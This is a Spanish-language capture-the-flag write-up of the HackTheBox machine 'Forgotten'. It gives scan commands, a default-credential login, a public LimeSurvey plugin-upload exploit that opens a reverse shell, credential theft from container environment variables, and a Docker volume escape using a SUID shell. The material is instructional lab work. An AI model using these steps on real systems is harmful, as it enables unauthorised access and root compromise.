---
title: Forgotten
description: Writeup de la máquina Forgotten de HackTheBox. LimeSurvey RCE + Docker volume privesc.
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - cve-2021-44967
  - limesurvey
  - default-credentials
  - docker-escape
  - suid
---

| Campo | Valor |
|---|---|
| **Dificultad** | 🟢 Easy |
| **SO** | Linux |
| **IP** | `10.129.234.81` |
| **Técnicas** | LimeSurvey RCE, Docker escape, SUID |
| **CVE** | CVE-2021-44967 |

---

## 1. 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- -vvv --min-rate 10000 10.129.234.81
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62
```

```bash
nmap -p 22,80 -sCV 10.129.234.81
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.56 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.2
```

> [!info] Docker detectado
> El host es `172.17.0.2` — indica que la aplicación corre dentro de un **contenedor Docker**. La IP del host real es la de HTB.

---

### Enumeración web

```bash
ffuf -u http://10.129.234.81/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
```

```
survey    [Status: 301, Size: 315]
```

> [!tip] LimeSurvey encontrado
> La aplicación en `/survey/` es **LimeSurvey versión 6.3.7+231127**.

---

## 2. 💥 Explotación — CVE-2021-44967: LimeSurvey Plugin Upload RCE

**CVE-2021-44967** permite a un usuario administrador subir un plugin ZIP malicioso que contiene una webshell PHP. Al activar el plugin, el servidor ejecuta código PHP arbitrario en el contexto del proceso Apache.

> [!warning] Credenciales por defecto
> Las credenciales `admin:password` son las por defecto de LimeSurvey en instalaciones sin hardening. **Siempre probar defaults antes que fuerza bruta.**

### Paso 1 — Clonar y lanzar el exploit

```bash
git clone https://github.com/godylockz/CVE-2021-44967
cd CVE-2021-44967

python3 limesurvey_rce.py \
  -t http://10.129.234.81/survey/ \
  -u 'admin' \
  -p 'password'
```

```
[*] Authenticating ...
[+] Login successful!
[*] Uploading plugin ...
[*] Activating plugin ...
[*] Starting listener and sending reverse shell ...
listening on [any] 4444 ...
```

---

## 3. 🐚 Acceso inicial — Shell en el contenedor Docker

```
connect to [10.10.14.X] from (UNKNOWN) [10.129.234.81]
$ id
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
```

> [!tip] Variables de entorno con credenciales
> Los contenedores Docker filtran secretos frecuentemente. Siempre ejecutar `env` tras obtener shell.

```bash
env | grep -i lime
```

```
LIMESURVEY_ADMIN=limesvc
LIMESURVEY_PASS=5W5HN4K4GCXf9E
```

**Credenciales obtenidas:** `limesvc : 5W5HN4K4GCXf9E`

### Shell estable vía SSH

```bash
ssh limesvc@10.129.234.81
```

---

## 4. 🔐 Escalada de privilegios — Docker volume escape

### Paso 1 — Verificar sudo

```bash
sudo -l
```

```
[sudo] password for limesvc: 5W5HN4K4GCXf9E

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
```

> [!danger] Sudo sin restricciones
> `(ALL : ALL) ALL` = root inmediato dentro del contenedor.

```bash
sudo -S su
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

---

### Paso 2 — Identificar el volumen compartido con el host

> [!info] Concepto clave
> El directorio `/var/www/html/survey` dentro del contenedor está montado desde el host en `/opt/limesurvey`. Cualquier archivo creado en el contenedor aparece en el host — y si tiene SUID, el host lo ejecutará con `euid=0`.

```bash
# Dentro del contenedor como root
cd /var/www/html/survey
cp /bin/sh open
chmod u+s open
```

---

### Paso 3 — Ejecutar el binario SUID desde el host

```bash
# En el host (limesvc@forgotten)
cd /opt/limesurvey
./open -p
```

```
# id
uid=2000(limesvc) gid=2000(limesvc) euid=0(root) groups=2000(limesvc)
# whoami
root
```

> [!tip] El flag `-p`
> Evita que el shell moderno descarte el EUID elevado cuando UID real ≠ EUID efectivo.

```bash
cat /root/root.txt
```

```
[root flag]
```

---

## 5. 🚩 Flags

| Flag | Valor |
|------|-------|
| **user.txt** | obtenida tras SSH como `limesvc` |
| **root.txt** | [root flag] |

---

## 6. 📚 Lecciones aprendidas

> [!note] Takeaways de esta máquina

**1. Credenciales por defecto primero**
`admin:password` en LimeSurvey funcionó sin fuerza bruta. Siempre probar defaults antes de cualquier otra cosa.

**2. Variables de entorno en Docker = goldmine**
`LIMESURVEY_PASS` estaba en el entorno del proceso Apache. Siempre correr `env` y `cat /proc/1/environ` dentro de contenedores.

**3. Volúmenes Docker compartidos = escalada lateral directa**
Si tienes root en el contenedor y puedes escribir en un volumen montado en el host, depositas un SUID binario y lo ejecutas desde el host con `euid=0`.

**4. `sudo (ALL:ALL) ALL` en contenedor sigue siendo útil**
Aunque "ya estés en un contenedor", root + volumen montado en host = comprometer el host.

**5. En máquinas similares buscar:**
- Aplicaciones web con credenciales por defecto
- Contenedores Docker con `sudo ALL` y volúmenes montados al host
- Variables de entorno con contraseñas (`env`, `/proc/1/environ`)

---

## 🔗 Referencias

- [CVE-2021-44967 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44967)
- [PoC Exploit - godylockz](https://github.com/godylockz/CVE-2021-44967)
- [HackTricks - Docker Breakout](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html)